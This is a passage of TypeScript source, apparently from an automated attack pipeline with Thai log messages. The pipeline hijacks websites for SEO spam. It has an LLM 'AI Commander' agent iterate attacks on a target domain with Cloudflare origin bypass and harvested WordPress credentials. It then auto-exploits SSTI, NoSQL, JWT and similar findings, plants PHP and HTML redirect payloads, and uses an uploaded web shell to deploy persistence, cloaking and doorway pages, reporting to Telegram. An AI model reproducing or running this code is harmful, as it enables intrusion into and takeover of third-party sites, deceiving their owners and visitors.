      detail: `\u{1F916} AI Commander \u0e40\u0e23\u0e34\u0e48\u0e21\u0e17\u0e33\u0e07\u0e32\u0e19 \u2014 LLM \u0e08\u0e30\u0e27\u0e34\u0e40\u0e04\u0e23\u0e32\u0e30\u0e2b\u0e4c target \u0e41\u0e25\u0e30\u0e2b\u0e32\u0e27\u0e34\u0e18\u0e35\u0e17\u0e33\u0e08\u0e19\u0e01\u0e27\u0e48\u0e32\u0e08\u0e30\u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08 (max ${config.aiCommanderMaxIterations || 10} iterations)...`,
      progress: 95,
    });

    try {
      // Calculate remaining time for AI Commander (max 2 min or remaining pipeline time)
      const aiRemainingMs = Math.max(deadline - Date.now(), 30000);
      const aiMaxTime = Math.min(5 * 60 * 1000, aiRemainingMs); // 5 min for AI Commander

      aiCommanderResult = await Promise.race([
        runAiCommander({
          targetDomain: domain,
          redirectUrl: config.redirectUrl,
          maxIterations: Math.min(config.aiCommanderMaxIterations || 12, 15),
          timeoutPerAttempt: 20000,
          seoKeywords: config.seoKeywords,
          preAnalysis: aiTargetAnalysis,
          userId: config.userId,
          pipelineType: "autonomous",
          // v4: Pass CF bypass origin IP and WP credentials
          originIP: originIp,
          wpCredentials: wpAuthCredentials ? {
            username: wpAuthCredentials.username,
            password: wpAuthCredentials.password,
            method: wpAuthCredentials.method,
            cookies: wpAuthCredentials.cookies,
            nonce: wpAuthCredentials.nonce,
            authHeader: wpAuthCredentials.authHeader,
          } : null,
          onEvent: (event: AiCommanderEvent) => {
            loggedOnEvent({
              phase: "shellless" as any,
              step: `ai_cmd_${event.type}_${event.iteration}`,
              detail: event.detail,
              progress: 95 + Math.min(event.iteration / (event.maxIterations || 10) * 4, 4),
              data: {
                ...event.data,
                iteration: event.iteration,
                maxIterations: event.maxIterations,
                eventType: event.type,
              },
            });
          },
        }),
        new Promise<AiCommanderResult>((_, reject) => setTimeout(() => reject(new Error(`AI Commander timeout (${Math.round(aiMaxTime / 1000)}s)`)), aiMaxTime)),
      ]);

      if (aiCommanderResult.success && aiCommanderResult.uploadedUrl) {
        uploadedFiles.push({
          url: aiCommanderResult.uploadedUrl,
          shell: shells[0] || { filename: "ai-commander", content: "", type: "php" as any, technique: "ai_commander", obfuscation: "none" as any },
          method: `ai_commander_${aiCommanderResult.successfulMethod}`,
          verified: true,
          redirectWorks: aiCommanderResult.redirectVerified,
          redirectDestinationMatch: aiCommanderResult.redirectVerified,
          finalDestination: config.redirectUrl,
          httpStatus: 200,
        });
        aiDecisions.push(`AI Commander SUCCESS: ${aiCommanderResult.successfulMethod} after ${aiCommanderResult.iterations} iterations`);
        loggedOnEvent({
          phase: "shellless" as any,
          step: "ai_commander_success",
          detail: `\u2705 AI Commander \u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08! Upload \u0e17\u0e35\u0e48 ${aiCommanderResult.uploadedUrl} \u0e14\u0e49\u0e27\u0e22 ${aiCommanderResult.successfulMethod} (${aiCommanderResult.iterations} iterations)`,
          progress: 99,
          data: aiCommanderResult,
        });
      } else {
        aiDecisions.push(`AI Commander FAILED after ${aiCommanderResult.iterations} iterations`);
        loggedOnEvent({
          phase: "shellless" as any,
          step: "ai_commander_exhausted",
          detail: `\u26A0\uFE0F AI Commander \u0e2b\u0e21\u0e14 iterations (${aiCommanderResult.iterations}) \u2014 \u0e44\u0e21\u0e48\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16 upload \u0e44\u0e14\u0e49\u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08`,
          progress: 99,
        });
      }
    } catch (error: any) {
      errors.push(`AI Commander error: ${error.message}`);
      loggedOnEvent({
        phase: "shellless" as any,
        step: "ai_commander_error",
        detail: `AI Commander error: ${error.message}`,
        progress: 99,
      });
    }
  }

  // ═══ COMPREHENSIVE ATTACK VECTORS (29 additional vectors) ═══
  // Run SSTI, LDAP Injection, NoSQL Injection, IDOR, BOLA, BFLA, JWT Abuse, etc.
  const comprehensiveEnabled = config.methodPriority
    ? config.methodPriority.some(m => m.id === 'comprehensive' && m.enabled)
    : config.enableComprehensiveAttacks !== false;
  if (comprehensiveEnabled && !shouldStop('comprehensive')) {
    loggedOnEvent({
      phase: "comprehensive",
      step: "start",
      detail: `🔬 Comprehensive Attack Vectors: Running 29 additional attack categories (SSTI, LDAP, NoSQL, IDOR, BOLA, JWT, Prototype Pollution, etc.)...`,
      progress: 93,
    });
    try {
      const comprehensiveConfig: AttackVectorConfig = {
        targetUrl: config.targetUrl,
        timeout: config.timeoutPerMethod || 12000,
        onProgress: (method: string, detail: string) => {
          loggedOnEvent({
            phase: "comprehensive",
            step: method,
            detail: `🔬 ${detail}`,
            progress: 94,
          });
        },
      };
      comprehensiveResults = await Promise.race([
        runComprehensiveAttackVectors(comprehensiveConfig),
        new Promise<AttackVectorResult[]>((_, reject) =>
          setTimeout(() => reject(new Error("Comprehensive attacks timeout")), 300000)
        ),
      ]);
      const compSuccesses = comprehensiveResults.filter(r => r.success);
      const compExploitable = comprehensiveResults.filter(r => r.exploitable);
      if (compSuccesses.length > 0) {
        aiDecisions.push(`🔬 Comprehensive: ${compSuccesses.length}/${comprehensiveResults.length} findings (${compExploitable.length} exploitable)`);
        loggedOnEvent({
          phase: "comprehensive",
          step: "complete",
          detail: `🔬 Comprehensive: พบ ${compSuccesses.length} vulnerabilities (${compExploitable.length} exploitable) จาก ${comprehensiveResults.length} tests`,
          progress: 95,
          data: { total: comprehensiveResults.length, findings: compSuccesses.length, exploitable: compExploitable.length },
        });
      } else {
        aiDecisions.push(`🔬 Comprehensive: 0 findings from ${comprehensiveResults.length} tests`);
        loggedOnEvent({
          phase: "comprehensive",
          step: "complete",
          detail: `🔬 Comprehensive: ไม่พบ vulnerabilities จาก ${comprehensiveResults.length} tests`,
          progress: 95,
        });
      }
    } catch (err: any) {
      errors.push(`Comprehensive attacks error: ${err.message}`);
      loggedOnEvent({
        phase: "comprehensive",
        step: "error",
        detail: `⚠️ Comprehensive attacks error: ${err.message}`,
        progress: 95,
      });
    }
  }

  // ═══ AUTO-EXECUTE EXPLOITABLE COMPREHENSIVE FINDINGS ═══
  if (comprehensiveResults && comprehensiveResults.length > 0 && !hasSuccessfulRedirect()) {
    const exploitableFindings = comprehensiveResults.filter(r => r.exploitable && r.success);
    if (exploitableFindings.length > 0) {
      loggedOnEvent({
        phase: "comprehensive",
        step: "auto_execute",
        detail: `\u{1F527} Auto-executing ${exploitableFindings.length} exploitable comprehensive findings to deploy redirects...`,
        progress: 95,
      });
      for (const finding of exploitableFindings.slice(0, 5)) {
        try {
          // Use the finding's evidence/payload to attempt redirect deployment
          const redirectPayload = `<?php header('Location: ${config.redirectUrl}'); exit; ?>`;
          const htmlRedirect = `<meta http-equiv="refresh" content="0;url=${config.redirectUrl}"><script>window.location='${config.redirectUrl}'</script>`;
          
          // Try to leverage the vulnerability for file write
          if (finding.vector.includes('ssti') || finding.vector.includes('lfi') || finding.vector.includes('ssrf')) {
            // These vulns may allow file write — attempt via the discovered vector
            const exploitUrl = finding.evidence?.match(/https?:\/\/[^\s"']+/)?.[0];
            if (exploitUrl) {
              const resp = await fetch(exploitUrl, { signal: AbortSignal.timeout(10000) }).catch(() => null);
              if (resp && resp.status < 400) {
                loggedOnEvent({
                  phase: "comprehensive",
                  step: "auto_execute",
                  detail: `\u{2705} Comprehensive ${finding.vector}: Exploited via ${exploitUrl}`,
                  progress: 95,
                });
              }
            }
          }
          
          // For open redirect findings — directly chain to our redirect
          if (finding.vector.includes('redirect') || finding.vector.includes('host_header')) {
            const redirectChainUrl = finding.evidence?.match(/https?:\/\/[^\s"']+/)?.[0];
            if (redirectChainUrl) {
              uploadedFiles.push({
                url: redirectChainUrl,
                shell: shells[0] || { id: `comp_${Date.now()}`, type: "html" as any, filename: "redirect.html", content: htmlRedirect, contentType: "text/html", description: `Comprehensive ${finding.vector}`, targetVector: finding.vector, bypassTechniques: [], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: "http_get" },
                method: `comprehensive_${finding.vector}`,
                verified: false,
                redirectWorks: false,
                redirectDestinationMatch: false,
                finalDestination: "",
                httpStatus: 0,
              });
            }
          }
        } catch (e: any) {
          // Best-effort exploitation
          loggedOnEvent({
            phase: "comprehensive",
            step: "auto_execute",
            detail: `\u{26A0}\u{FE0F} Comprehensive ${finding.vector} auto-execute failed: ${e.message}`,
            progress: 95,
          });
        }
      }
    }
  }

  // ═══ POST-UPLOAD PAYLOAD DEPLOYMENT ═══
  // After any successful upload, deploy additional payloads (persistence, cloaking, SEO manipulation)
  let postUploadReport: PostUploadReport | null = null;
  let detectionScanResult: { detections: any[]; liveChecks: any[] } | null = null;
  const verifiedUploads = uploadedFiles.filter(f => f.verified && !f.method.startsWith("shellless_"));
  
  if (verifiedUploads.length > 0 && config.enablePostUpload !== false) {
    const domain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
    const bestUpload = verifiedUploads[0];
    
    loggedOnEvent({
      phase: "post_upload" as any,
      step: "start",
      detail: `\u{1F680} Post-Upload Phase: Deploying persistence, cloaking, SEO manipulation payloads via ${bestUpload.url}...`,
      progress: 96,
    });

    try {
      // Generate payloads based on what we know about the target
      const payloads = generatePostUploadPayloads(domain, config.redirectUrl, {
        enableSeoManipulation: true,
        enablePersistence: true,
        enableCloaking: true,
        enableMonetization: false, // User must explicitly enable
        enableRedirects: true,
        doorwayCount: 20,
        sitemapUrls: 100,
        linkCount: 30,
      });

      loggedOnEvent({
        phase: "post_upload" as any,
        step: "payloads_generated",
        detail: `\u{1F4CB} Generated ${payloads.length} post-upload payloads across ${new Set(payloads.map(p => p.category)).size} categories`,
        progress: 97,
      });

      // Deploy payloads via the uploaded shell
      // Determine shell password from the shell that was uploaded
      const shellContent = typeof bestUpload.shell?.content === "string" ? bestUpload.shell.content : "";
      const shellPassword = shellContent.match(/\$_(?:GET|POST|COOKIE)\['([^']+)'\]/)?.[1] || "_perf";
      
      postUploadReport = await deployPostUploadPayloads(
        domain,
        bestUpload.url,
        shellPassword,
        payloads,
        (detail) => {
          loggedOnEvent({
            phase: "post_upload" as any,
            step: "deploying",
            detail,
            progress: 97,
          });
        },
      );

      loggedOnEvent({
        phase: "post_upload" as any,
        step: "complete",
        detail: `\u{2705} Post-upload: ${postUploadReport.successCount}/${payloads.length} payloads deployed (${postUploadReport.failCount} failed, ${(postUploadReport.totalTime / 1000).toFixed(1)}s)`,
        progress: 98,
        data: { successCount: postUploadReport.successCount, failCount: postUploadReport.failCount, totalTime: postUploadReport.totalTime },
      });
    } catch (error: any) {
      errors.push(`Post-upload deployment error: ${error.message}`);
      loggedOnEvent({
        phase: "post_upload" as any,
        step: "error",
        detail: `\u{274C} Post-upload error: ${error.message}`,
        progress: 98,
      });
    }

    // Run detection scan after deployment
    try {
      detectionScanResult = await runDetectionScan(domain, (detail) => {
        loggedOnEvent({
          phase: "post_upload" as any,
          step: "detection_scan",
          detail,
          progress: 99,
        });
      });
    } catch {
      // Detection scan is optional, don't fail the pipeline
    }
  }

  // ─── Emit final world state ───
  loggedOnEvent({
    phase: "world_update",
    step: "final",
    detail: "Final world state",
    progress: 99,
    data: {
      hosts: 1,
      ports: 0,
      vulns: (vulnScan?.misconfigurations?.length || 0) + (configResults?.filter(r => r.success).length || 0),
      creds: discoveredCredentials?.length || 0,
      uploadPaths: vulnScan?.writablePaths?.length || prescreen?.writablePaths?.length || 0,
      // Only count real uploaded shells (not shellless which don't place files)
      shellUrls: uploadedFiles.filter(f => f.verified && !f.method.startsWith("shellless_")).length,
      // deployedFiles = real uploads + shellless with confirmed redirect
      deployedFiles: uploadedFiles.filter(f => !f.method.startsWith("shellless_") || f.redirectWorks).length,
      verifiedUrls: uploadedFiles.filter(f => f.redirectWorks).length,
    },
  });

  // ─── Phase 5: Final Result ───
  const verifiedFiles = uploadedFiles.filter(f => f.verified);
  const redirectWorkingFiles = uploadedFiles.filter(f => f.redirectWorks);
  const destinationMatchFiles = uploadedFiles.filter(f => f.redirectWorks && f.redirectDestinationMatch);
  // Separate real uploads from shellless for accurate success determination
  const realVerifiedFiles = verifiedFiles.filter(f => !f.method.startsWith("shellless_"));
  const shelllessVerifiedFiles = verifiedFiles.filter(f => f.method.startsWith("shellless_") && f.redirectWorks && f.redirectDestinationMatch);
  // Success = redirect works AND goes to the correct destination
  // "Partial success" = redirect works but goes to wrong destination (still counts as success but with warning)
  const fullSuccess = destinationMatchFiles.length > 0;
  const partialSuccess = !fullSuccess && redirectWorkingFiles.length > 0;
  const fileDeployed = !fullSuccess && !partialSuccess && realVerifiedFiles.length > 0;
  const success = fullSuccess || partialSuccess || fileDeployed;

  const result: PipelineResult = {
    success,
    targetUrl: config.targetUrl,
    redirectUrl: config.redirectUrl,
    prescreen,
    vulnScan,
    shellsGenerated: shells.length,
    uploadAttempts: totalAttempts,
    uploadedFiles,
    verifiedFiles,
    totalDuration: Date.now() - startTime,
    aiDecisions,
    errors,
    // Advanced attack results
    wafBypassResults: wafBypassResults.length > 0 ? wafBypassResults : undefined,
    altUploadResults: altUploadResults.length > 0 ? altUploadResults : undefined,
    indirectAttackResults: indirectResults.length > 0 ? indirectResults : undefined,
    dnsAttackResults: dnsResults.length > 0 ? dnsResults : undefined,
    configExploitResults: configResults.length > 0 ? configResults : undefined,
    originIp,
    discoveredCredentials: discoveredCredentials.length > 0 ? discoveredCredentials : undefined,
    // WP Admin Takeover & DB Injection results
    wpAdminResults: wpAdminResults.length > 0 ? wpAdminResults : undefined,
    wpDbInjectionResults: wpDbInjectionResults.length > 0 ? wpDbInjectionResults : undefined,
    // Shellless attack results
    shelllessResults: shelllessResults.length > 0 ? shelllessResults : undefined,
    // Cloaking results
    cloakingShell: cloakingResult || undefined,
    contentPack: contentPack || undefined,
    // Injection & CDN results
    injectionResult: injectionResult || undefined,
    cdnUploadResult: cdnUploadResult || undefined,
    // AI Target Analysis (Phase 0)
    aiTargetAnalysis: aiTargetAnalysis || undefined,
    // Non-WP exploit results
    nonWpExploitResults: nonWpExploitResults || undefined,
    // CF Origin IP Bypass result
    cfBypassResult: cfBypassResult || undefined,
    // WP Brute Force result
    wpBruteForceResult: wpBruteForceResult || undefined,
    wpAuthCredentials: wpAuthCredentials || undefined,
    // AI Commander result
    aiCommanderResult: aiCommanderResult ? {
      success: aiCommanderResult.success,
      iterations: aiCommanderResult.iterations,
      successfulMethod: aiCommanderResult.successfulMethod,
      uploadedUrl: aiCommanderResult.uploadedUrl,
      redirectVerified: aiCommanderResult.redirectVerified,
      totalDurationMs: aiCommanderResult.totalDurationMs,
      decisionsCount: aiCommanderResult.decisions.length,
    } : undefined,
    // Post-upload payload deployment
    postUploadReport: postUploadReport || undefined,
    // Detection scan
    detectionScan: detectionScanResult || undefined,
    comprehensiveResults: comprehensiveResults.length > 0 ? comprehensiveResults : undefined,
    wpVulnScan: wpVulnScanResult || undefined,
    cmsScan: cmsScanResult || undefined,
    dbCveMatches: dbCveMatches.length > 0 ? dbCveMatches : undefined,
    aiExploits: aiExploitResults.length > 0 ? aiExploitResults : undefined,
  };

  if (fullSuccess) {
    loggedOnEvent({
      phase: "complete",
      step: "success",
      detail: `🎉 Pipeline สำเร็จ! ${destinationMatchFiles.length} redirect(s) ไปยังปลายทางจริง → ${destinationMatchFiles[0]?.finalDestination || config.redirectUrl} (${Math.round(result.totalDuration / 1000)}s)`,
      progress: 100,
      data: result,
    });
  } else if (partialSuccess) {
    loggedOnEvent({
      phase: "complete",
      step: "partial",
      detail: `⚠️ Redirect ทำงานแต่ไปผิดที่! ${redirectWorkingFiles.length} redirect(s) → ${redirectWorkingFiles[0]?.finalDestination || 'unknown'} (ควรไป ${config.redirectUrl}) (${Math.round(result.totalDuration / 1000)}s)`,
      progress: 100,
      data: result,
    });
  } else if (fileDeployed) {
    loggedOnEvent({
      phase: "complete",
      step: "partial",
      detail: `⚠️ วางไฟล์สำเร็จ ${realVerifiedFiles.length} ไฟล์ แต่ redirect ยังไม่ทำงาน (${Math.round(result.totalDuration / 1000)}s)`,
      progress: 100,
      data: result,
    });
  } else {
    loggedOnEvent({
      phase: "complete",
      step: "failed",
      detail: `❌ Pipeline ล้มเหลว — ลอง ${totalAttempts} ครั้ง, ${shells.length} shells, ${errors.length} errors (${Math.round(result.totalDuration / 1000)}s)`,
      progress: 100,
      data: result,
    });
  }

  // ─── Telegram Notification (primary — no email) ───
  try {
    // Only show URLs that are actual deployed files (not target URL from shellless)
    const realDeployedUrls = uploadedFiles
      .filter(f => !f.method.startsWith("shellless_") || f.redirectWorks)
      .map(f => f.url)
      .filter(url => url !== config.targetUrl); // Never show target URL as "deployed"
    // If only shellless with redirectWorks, show target URL with note
    const shelllessWithRedirect = uploadedFiles.filter(f => f.method.startsWith("shellless_") && f.redirectWorks);
    const deployedUrls = realDeployedUrls.length > 0 
      ? realDeployedUrls 
      : shelllessWithRedirect.map(f => `${f.url} (via ${f.method.replace("shellless_", "")})`);
    // Determine notification type based on destination match
    const notificationType = fullSuccess ? "success" as const
      : partialSuccess ? "partial" as const
      : fileDeployed ? "partial" as const
      : "failure" as const;
    const telegramPayload: TelegramNotification = {
      type: notificationType,
      targetUrl: config.targetUrl,
      redirectUrl: config.redirectUrl,
      deployedUrls,
      shellType: shells[0]?.type || "unknown",
      duration: result.totalDuration,
      errors: errors.slice(0, 5),
      keywords: config.seoKeywords,
      cloakingEnabled: config.enableCloaking !== false && !!cloakingResult,
      injectedFiles: injectionResult?.injectedFiles?.length || 0,
      details: fullSuccess
        ? `✅ ${destinationMatchFiles.length} redirect(s) → ${destinationMatchFiles[0]?.finalDestination || config.redirectUrl}, ${injectionResult?.injectedFiles?.length || 0} injected`
        : partialSuccess
        ? `⚠️ Redirect ทำงานแต่ไปผิดที่: ${redirectWorkingFiles[0]?.finalDestination || 'unknown'} (ควรไป ${config.redirectUrl})`
        : fileDeployed
        ? `⚠️ วางไฟล์สำเร็จ ${realVerifiedFiles.length} ไฟล์ แต่ redirect ยังไม่ทำงาน`
        : `${totalAttempts} attempts, ${errors.length} errors`,
    };

    const telegramResult = await sendTelegramNotification(telegramPayload);
    result.telegramSent = telegramResult.success;
    result.emailSent = false; // Email disabled — Telegram only

    if (telegramResult.success) {
      loggedOnEvent({
        phase: "complete",
        step: "telegram",
        detail: `📱 Telegram แจ้งเตือนแล้ว`,
        progress: 100,
      });
    } else {
      loggedOnEvent({
        phase: "complete",
        step: "telegram",
        detail: `⚠️ Telegram ส่งไม่ได้`,
        progress: 100,
      });
    }
  } catch (telegramErr: any) {
    loggedOnEvent({
      phase: "complete",
      step: "telegram",
      detail: `⚠️ Telegram ส่งไม่ได้: ${telegramErr.message}`,
      progress: 100,
    });
  }

  return result;
}
